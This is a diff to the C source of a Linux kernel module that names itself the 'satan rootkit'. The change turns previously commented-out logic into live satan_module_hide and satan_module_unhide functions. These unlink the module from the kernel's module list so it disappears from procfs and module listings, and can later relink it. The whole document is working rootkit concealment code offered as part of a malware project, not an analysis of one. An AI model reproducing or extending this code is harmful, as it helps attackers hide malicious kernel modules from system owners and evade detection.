@@ -7,30 +7,31 @@
 static bool is_hidden = false;
 static struct list_head *module_prev = NULL;
 
-bool satan_is_hidden(void)
-{
-        return is_hidden;
-}
 
-void satan_set_hidden(bool hidden)
+/**
+ * satan_module_hide() - Hides satan rootkit.
+ */
+void satan_module_hide(void)
 {
-        if (hidden) {
-                pr_info("satan: hiding...\n");
-        } else {
-                pr_info("satan: unhiding...\n");
-        }
-        /*
-        if (is_hidden == hidden)
+        if (is_hidden)
                 return;
 
-        if (hidden) {  // hide module
-                module_prev = THIS_MODULE->list.prev;  // backup prev node in module list.
-                list_del(&THIS_MODULE->list);  // removes from procfs
-        } else {  // unhide module
-                list_add(&THIS_MODULE->list, module_prev);
-                module_prev = NULL;
-        }
+        module_prev = THIS_MODULE->list.prev;  // backup prev node in module list.
+        list_del(&THIS_MODULE->list);  // removes from procfs
 
-        is_hidden = hidden;
-        */
+        is_hidden = true;
+}
+
+/**
+ * satan_module_unhide() - Unhides satan rootkit.
+ */
+void satan_module_unhide(void)
+{
+        if (!is_hidden)
+                return;
+
+        list_add(&THIS_MODULE->list, module_prev);
+        module_prev = NULL;
+
+        is_hidden = false;
 }
